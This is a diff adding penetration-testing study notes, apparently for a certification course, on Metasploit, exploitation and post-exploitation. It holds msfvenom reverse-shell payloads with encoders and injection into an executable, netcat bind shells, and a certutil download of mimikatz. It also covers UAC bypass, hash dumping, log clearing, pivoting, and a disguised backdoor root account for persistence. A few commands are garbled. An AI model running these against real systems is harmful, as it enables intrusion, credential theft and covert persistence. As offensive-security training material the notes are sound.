@@ -619,3 +619,636 @@ https://www.comparitech.com/net-admin/wireshark-cheat-sheet/
 
 
 # 3.3 The Metasploit Framework (MSF)
+
+**Non-Staged Payload**: Payload send to target with the exploit
+
+**Staged Payload**: Payload send to target in 2 parts. first part contains the payload to establish a reverse connection and download the second part of the payload and execute it.
+
+**Stagers**: to establish a stable connection channel
+
+MSF Module Location: `/usr/share/metsaploit-framework/modules` and for specific user: `~/.ms4/modules`
+
+-> look at ptes methodology github 
+
+-> configuration
+
+`systemctl enable postgresql` or `service postgresql start`
+
+`msfdb init` if errors do `msfdb reinit` but reinit will remove your database
+
+-> MSF common commands
+```
+show all
+show encoders
+show exploits
+search -h
+use -h
+back
+workspace -> list all workspaces
+hosts
+workspace -h
+workspace -a $name_workspace -> creat a workspace
+workspace $name_workspace to switch to a workspace
+setg lport 4444
+setg lhost $ip
+setg rhosts $target_ip
+search type:auxiliary name:http -> smtp_login, smtp_enum, and so on
+search type:exploit name:http
+```
+
+## Port Scanning with nmap
+
+Options already discussed in information gathering section!!!
+```
+kali> nmap -sV -Pn $ip -oX nmap_results` -> to import the nmap_results to MSF, first create a new workspace, then open MSF, then 
+meterpreter> db_import /root/nmap_results`
+meterpreter> hosts -> to confirm that nmap_results are imported
+meterpreter> services -> show running services on target through the nmap_results
+meterpreter> vulns -> show vulns
+meterpreter> db_nmap -sV -Pn -O $ip -> here the results will be saved in the MSF database for the chosen workspace!!!
+```
+
+## Port Scanning with Auxiliary Modules
+```
+msf> search portscan ->  and then use any module you like
+after exploiting
+meterpreter> run autoroute -s $target_ip_1_target
+meterpreter> background
+then search for portscan and choose one and "set RHOSTs $ip_from_another_subnet_2_target"
+```
+
+## Installing MSF autopwn
+1. download it from github
+
+2. move it to /usr/share/metasploit-framework/plugins/
+
+3. load it in metasploit `msf6> load db_autopwn`
+
+
+## Nessus
+install it -> run it -> export a report -> import the report to metasploit `db_import $report` 
+
+
+## WMAP
+```
+msf6> load wmap
+msf6> wmap_sites -h
+msf6> wmap_sites -a $ip -> set all targets you want to scan in the feature
+msf6> wmap_targets -a
+msf6> wmap_run -t http://$ip -> set target to scan now 
+msf6> wmap_run -h
+msf6> wmap_run -t
+msf6> wmap_vulns -l -> list all vulns found
+msf6> wmap_run -e
+msf6> vulns -> list detaits about found vulns
+```
+
+
+## MSF payloads
+```
+kali> msfvenom --list payloads
+kali> msfvenom -a x86 -p windows/meterpreter/reverse_tcp .......
+kali> msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp .......
+```
+
+-> encoding and injecting
+```
+msfvenom --list encoders
+-e -> $encode_type to set the encoding type
+-i 10 -> to set the number of encoding iterations to 10, the more the better
+-x winrar.exe -> to inject payload into another .exe programm
+-k
+```
+
+`run post/windows/manage/migrate` -> migrate the process to another one
+
+## automation
+`/usr/share/metasploit-framework/scripts/resource` -> some automation scripts
+
+`vim handler.rc`
+```
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.10.2
+set LPORT 1234
+run
+```
+to run the script `msfconsole -r handler.rc`
+
+`vim scan.rc`
+```
+use auxilary/scanner/portscan/tcp
+set rhost 10.10.10.2
+run
+```
+to run the script `msfconsole -r scan.rc`
+
+-> to export command you types:
+`msf6> makerc ~/Desktop/mycommands.rc`
+
+
+
+# Exploitation
+
+## Windows Exploitation
+1. nmap
+2. msf6 > search Proftp
+3. exploit it 
+
+if meterpreter session is x86 and the target system is x64 so set the payload to x64
+`set payload windows/x64/meterpreter/reverse_tcp` 
+
+
+## Linux Exploitation
+1. nmap
+2. msf6 > search Proftp
+3. exploit it 
+
+
+-> to upgrade session from shell to meterpreter
+`session -u $session_id`
+or
+`search shell_to_meterpreter`
+
+
+
+locate /opt/framework3/msf3
+msfconsole -> to run the MSF
+
+-> to run a module from inside the meterpreter:
+```
+meterpreter > run post/multi/gather/env
+
+or crtl(strg) + z / background then 
+
+msf > use post/windows/gather/hashdump
+msf > show options 
+msf > set SESSION 1 
+msf > run
+```
+
+-> Encode a payload from msfpayload 5 times using shikata ga-nai encoder and output as executable: 
+`$ msfvenom -p windows/meterpreter/reverse_tcp -i 5 -e x86/shikata_ga_nai -f exe LHOST=10.1.1.1 LPORT=4444 > mal.exe`
+
+-> to search for a module:
+`msf > search [regex]`
+
+-> Run the exploit expecting a single session that is 
+immediately backgrounded:
+`msf > exploit -z`
+
+-> Run the exploit in the background expecting one or more sessions that are immediately backgrounded:
+`msf > exploit –j` 
+
+-> List all current jobs (usually exploit listeners): 
+`msf > jobs –l` 
+
+-> Kill a job: 
+`msf > jobs –k [JobID]`
+
+-> List all backgrounded sessions:
+`msf > sessions -l`
+
+-> Interact with a backgrounded session:
+`msf > session -i [SessionID]` 
+
+-> Background the current interactive session: 
+`meterpreter > <Ctrl+Z>` 
+or
+`meterpreter > background`
+
+# 3.4 Exploitation
+
+## Banner Grabbing
+`nmap -sV --script=banner $ip`
+
+`nc $ip $port`
+
+`ls /usr/share/nmap/scripts | grep shellshock`
+
+
+## Searching for exploits
+`msf6> search xxxx`
+
+`searchsploit xxxx`
+
+`exploit-db.com`
+
+`rapid7.com/db`
+
+`search on google`
+
+`search on github`
+
+## Compile Exploits
+`apt install mingw-w64`
+
+`i686-w64-mingw32-gcc exploit.c -o exploit.exe`
+
+`i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32` -> exploit for 32 bits
+
+`gcc exploit.c -o exploit.exe`
+
+## Bind and Reverse shell
+`nc $ip $port <options>`
+
+`nc $ip $port  -nv < text.txt` transfer a file
+
+`nc $ip $port  -nv > text.txt` recieve a file
+
+-> for windows - bind shell
+
+`nc $ip $port  -nvlp 1234 -e cmd.exe` listener to connect to a target through cmd
+
+`nc $ip $port  -nv` to connect to that listener through cmd
+
+-> for linux - bind shell
+
+`nc $ip $port  -nvlp 1234 -c /bin/bash/` listener to connect to a target through bash
+
+`nc $ip $port  -nv` to connect to that listener through bash
+
+-> reverse shell sheet cheat on github allThePayloads or on revshells.com
+
+## Powershell Empire
+```
+apt install powershell-empire starkiller -y
+powershell-empire server
+powershell-empire client
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f asp > shell.aspx
+```
+Note: if you do not get the banner from nmap try it manually with netcat `nc $ip $port`
+
+
+# 3.5 Post-Exploitation
+ ## Enumeration System Information
+What are we Looking for ? 
+- Hostname
+- OS Name (Windows 7, 8 etc..)
+- OS Build & Service Pack (windows 7 SP1 7600)
+- OS Architecture (x64/x86)
+- Installed Updates/Hotfixes 
+
+`meterpreter> getuid`
+
+`meterpreter> sysinfo`
+
+`shell> hostname`
+
+`shell> systeminfo`
+
+`wmic qfe get Caption,Description,HotFixID,InstalledOn` -> to get additional infos about the updates
+
+
+## Enumerating Users & Groups
+- Current User and Privileges
+- Additional User information policy
+- Other users on the system
+- groups
+- members of the built-in administrator group
+
+`meterpreter> getuid` == `shell> whoami`
+
+`meterpreter> getprivs` == `shell> whoami /priv`
+
+`msf> search enum_logged_on_users`
+
+`shell> query user`
+
+`shell> net user administrator`
+
+`shell> net localgroup` -> enumerate current user for localgroup
+
+`shell> net localgroup administrators` -> show users, that are in the localgroup of the administrators
+
+
+## Enumerating Networking information
+- Current IP and network adapter
+- internal networks
+- tcp/udp services
+- other hosts on the network
+- routing table
+- windows firewall state
+
+`shell> ipconfig`
+
+`shell> route print` -> to get the routing table
+
+`shell> arp -a` -> to discover other hosts on the network
+
+`shell> netstat -ano`
+
+`shell> netsh firewall show state`
+
+`shell> netsh firewall show state` -> it may be deprecated
+
+`shell> netsh advfirewall firewall help`
+
+`shell> netsh advfirewall firewall dump`
+
+`shell> netsh advfirewall show allprofiles`
+
+
+## Enumerating Process and Services
+- Running Process and Services
+- Scheduled tasks
+
+`meterpreter> ps`
+
+`meterpreter> pgrep explorer.exe` -> search for specific process
+
+`meterpreter> migrate $process_id` -> migrate to explorer.exe, because it is stable
+
+`shell> net start` 
+
+`shell> wmic service list brief` -> show services
+
+`shell> tasklist /SVC` -> display list of services with its process
+
+`shell> schtasks /query /fo LIST`-> enumerate schedule tasks
+
+
+## Automating Windows Local Enumeration
+`meterpreter> show_mount`
+
+`msf> search win_privs`
+
+`msf> search enum_logged`
+
+`msf> search checkvm`
+
+`msf> search enum_applications`
+
+`msf> search enum_computers`
+
+`msf> search enum_patches`
+
+`msf> search enum_shares`
+
+download the JAWS powershell script and run it to enumerate the system locally!
+
+upload it to Temp directory in the C: drive
+
+`shell> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws-enum.txt`
+
+`meterpreter> download jaws-enum.txt`
+
+
+
+# Linux
+## Enumerating System Information
+- Hostname
+- Distribution and distribution release version
+- kernel version and architecture
+- CPU information
+- Disk information and mounted drives
+- installed packages/software
+- 
+`meterpreter> sysinfo`
+
+`bash> cat /etc/*release`
+
+`bash> cat /etc/issue`
+
+`bash> uname -a`
+
+`bash> env`
+
+`bash> lscpu`
+
+`bash> df -h`
+
+`bash> lsblk`
+
+`bash> `
+
+`bash> lsblk`
+
+## Enumerating Users & Groups
+- Current User and Privileges
+- Other users on the system
+- groups and members in these groups
+
+`bash> cat /etc/passwd`
+
+`bash> groups $username` -> display groups, that a user in them
+
+`bash> usermod -aG $group $username` -> add user to a group
+
+`bash> last` -> see users, that logged as ssh
+
+`bash> lastlog`
+
+## Enumerating Networking information
+- Current IP and network adapter
+- internal networks
+- tcp/udp services
+- other hosts on the network
+
+`meterpreter> ifconfig`
+
+`meterpreter> netstat` -> display udp/tcp connections
+
+`meterpreter> route` -> display routing table
+
+`meterpreter> arp`
+
+`bash> cat /etc/networks` -> display interfaces and its ip
+
+`bash> cat /etc/hostname`
+
+`bash> cat /etc/hosts`
+
+`bash> cat /etc/resolv.conf`
+
+## Enumerating Process and Cron Jobs
+- Running Process and Services
+- Cron Jobs
+
+`bash> ps`
+
+`bash> crontab -a`
+
+`bash> crontab -l`
+
+## Automating Linux Local Enumeration
+- use LinPeas or LinEnum tool from github
+
+`msf> search enum_configs`-> results are saved in the loot directory under /home/username/.msf4/loot
+
+`msf> search enum_network`
+
+`msf> search enum_system`
+
+`msf> search checkvm`
+
+
+## Transfering files 
+`python -m SimpleHTTPServer 80`
+
+`python3 -m http.server 80`
+
+`certutil -urlcache -f http://$ip:$port/mimikatz.exe mimikatz.exe`
+
+## Upgrading from non-interactive shells
+`/bin/bash -i`
+
+`python -c "import pty; pty.spawn('/bash/bin/')"`
+
+`perl -e "exec '/bin/bash';"`
+
+`ruby: exec '/bin/bash'`
+
+
+## Post-Exploitation 
+`meterpreter> getsystem` -> to get higher privileges
+
+`meterpreter> getuid`
+
+`meterpreter> getprivs`
+
+`meterpreter>  show_mount`
+
+`meterpreter>  ps`
+
+`meterpreter>  migrate $process_id` -> to migrate to a process with higher privileges
+
+`meterpreter>  background`
+
+## Post-Exploitation Windows
+
+## Post-Exploitation-Modules
+`msf6> search migrate` -> you can use any module you like for post-exploitation
+
+`msf6> search win_privs` -> to enumerate privilege escalation
+
+`msf6> search enum_logged_on`
+
+`msf6> search checkvm` -> to check if target on vm
+
+`msf6> search enum_applications` -> enum installed application on target
+
+`msf6> search enum_av platform:windows type:post` -> check for firewall
+
+`msf6> search search enum_computer`
+
+`msf6> search search enum_patches`
+
+`msf6> search enum_shares`
+
+`msf6> search *enum*` -> show all enumeration modules
+
+`msf6> search rdp platform:windows` -> use any module you like, you can try all of them
+
+
+
+## Bypass UAC
+`msf6> search bypassuac`
+
+`msf6> search bypassuac_injection`
+
+`meterpreter> getsystem`
+
+`meterpreter> hashdump`
+
+if you can not get the hashdump try to migrate to another process like lsass or explorer 
+
+## Mimikatz and kiwi
+already explained before
+
+## Pass the hash
+already explained before
+
+## Persistence 
+`search platform:windows persistence`
+
+`search platform:windows persistence_service` -> if you kill all sessions and run the handler(same payload, port), you will get the session again
+
+## Persistence with RDP
+port 3389. RDP is disabled by default on windows but we can use a metasploit module to enable it after we exploit the victim
+
+`search enable_rdp`
+
+`target> net user administrator password123` -> to modify 
+
+`linux> xfreerdp /u:administrator /p:password123 /v:$ip`
+
+## Clearing logs
+`meterpreter> clearev`
+
+## Pivoting
+`meterpreter> ifconfig`
+
+`meterpreter> run autoroute -s $ip_internal/24` -> after this route you can access that $ip_internal/24 through the victim_ip
+
+`msf6 > search portscan`
+
+`msf6 > set rhosts $ip_internal`
+
+`meterpreter> portfwd add -l 1234 -p 80 -r $ip_internal`
+
+`msf6 > search portscan`
+
+
+
+## Post-Exploitation Linux
+`shell> cat /etc/passwd`
+
+`shell> cat /etc/*issue`
+
+`shell> env`
+
+`shell> netstat -antp`
+
+`shell> ps aux`
+
+`shell> groups username` -> what groups is this user part of
+
+`shell> uname -a`
+
+`shell> uname -r`
+
+`shell> chkrootkit -V` -> enumerate rootkit version
+
+`msf6> session -u $session_id`
+
+`msf6> search enum_config` -> this will get all configuration files
+
+`msf6> loot` -> to show where our gathered information are saved
+
+`msf6> search enum_network`
+
+`msf6> search env`
+
+`msf6> search enum_protections`
+
+`msf6> search enum_system`
+
+`msf6> search checkcontainer`
+
+`msf6> search checkvm`
+
+`msf6> search enum_users_history`
+
+`msf6> search hashdump`
+
+## Persistence	on Linux
+after exploitation and privilege escalation
+
+-> for persistence you can create a backdoor user but this only works if target server has ssh or remote access enabled
+The user should be difficult to identify like call the user "ftp" `useradd -m ftp -s /bin/bash;passwd ftp;usermod aG root ftp;usermod -u 15 ftp;usermod -g 15` 
+
+-> for persistence you can create a ssh keys. create a username and in that username create a new ssh keys
+
+`msf6> search platform:linux persistence`-> try all displayed modules if possible!
+
+to access ssh with a private key `ssh -i private-key root@$ip`
+
+
+
+
+
+
+
+
+
